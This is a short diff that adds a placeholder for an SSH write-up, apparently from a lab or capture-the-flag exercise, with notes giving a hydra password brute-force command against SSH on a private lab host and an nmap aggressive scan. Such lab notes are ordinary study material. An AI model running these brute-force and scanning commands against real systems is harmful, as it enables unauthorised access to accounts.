@@ -1,0 +1,5 @@
+INSERT SSH WRITEUP HERE
+
+notes:
+hydra -l marlinspike -P /usr/share/wordlists/fasttrack.txt 192.168.1.6 ssh -t 4
+nmap -A 192.168.1.6
